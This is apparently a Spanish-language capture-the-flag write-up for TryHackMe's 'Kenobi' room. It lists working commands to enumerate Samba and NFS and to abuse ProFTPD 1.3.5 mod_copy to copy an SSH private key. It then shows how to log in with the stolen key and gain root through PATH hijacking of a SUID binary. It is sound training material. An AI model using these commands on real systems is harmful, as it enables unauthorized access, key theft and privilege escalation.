---
title: "Kenobi - TryHackMe"
description: "Writeup de Kenobi, una sala que enseña explotación de ProFTPD y escalada de privilegios mediante SUID."
pubDate: 2024-10-13
platform: "tryhackme"
category: "rooms"
difficulty: "easy"
os: "linux"
language: es
tags: ["proftpd", "suid", "nfs"]
retired: false
heroImage: "/images/writeups/tryhackme/kenobi.jpg"
---

# Kenobi - TryHackMe Writeup

**Dificultad**: Easy  
**OS**: Linux  
**Plataforma**: TryHackMe

## Reconocimiento

```bash
nmap -sC -sV -oA kenobi 10.10.10.50
```

**Puertos abiertos:**
- 21/tcp (FTP - ProFTPD 1.3.5)
- 22/tcp (SSH)
- 80/tcp (HTTP)
- 111/tcp (rpcbind)
- 139/tcp (Samba)
- 445/tcp (Samba)
- 2049/tcp (NFS)

## Enumeración

### Samba

```bash
nmap -p 445 --script=smb-enum-shares,smb-enum-users 10.10.10.50

smbclient -L //10.10.10.50
```

**Share encontrado:** `anonymous`

```bash
smbclient //10.10.10.50/anonymous
get log.txt
```

El archivo `log.txt` revela información sobre ProFTPD y una llave SSH.

### NFS

```bash
nmap -p 111 --script=nfs-ls,nfs-statfs,nfs-showmount 10.10.10.50
```

**Shares NFS:**
- `/var`

## Explotación

### ProFTPD 1.3.5 - mod_copy

ProFTPD 1.3.5 tiene el módulo `mod_copy` que permite copiar archivos sin autenticación.

```bash
nc 10.10.10.50 21
SITE CPFR /home/kenobi/.ssh/id_rsa
SITE CPTO /var/tmp/id_rsa
```

### Montar NFS y obtener la llave

```bash
mkdir /mnt/kenobi
mount 10.10.10.50:/var /mnt/kenobi
cp /mnt/kenobi/tmp/id_rsa .
chmod 600 id_rsa
```

### SSH con la llave robada

```bash
ssh -i id_rsa kenobi@10.10.10.50
```

**User flag:**
```bash
cat /home/kenobi/user.txt
```

## Escalada de Privilegios

### Buscar binarios SUID

```bash
find / -perm -u=s -type f 2>/dev/null
```

Encontramos `/usr/bin/menu` con SUID.

### Análisis del binario

```bash
strings /usr/bin/menu
```

El binario ejecuta comandos sin ruta absoluta.

### Exploit

```bash
cd /tmp
echo "/bin/sh" > curl
chmod 777 curl
export PATH=/tmp:$PATH
/usr/bin/menu
# Seleccionar opción 1
```

**Root flag:**
```bash
cat /root/root.txt
```

## Conclusión

Kenobi enseña:
- Enumeración de servicios comunes (Samba, NFS, FTP)
- Explotación de ProFTPD mod_copy
- Escalada mediante binarios SUID
- Importancia de usar rutas absolutas en scripts
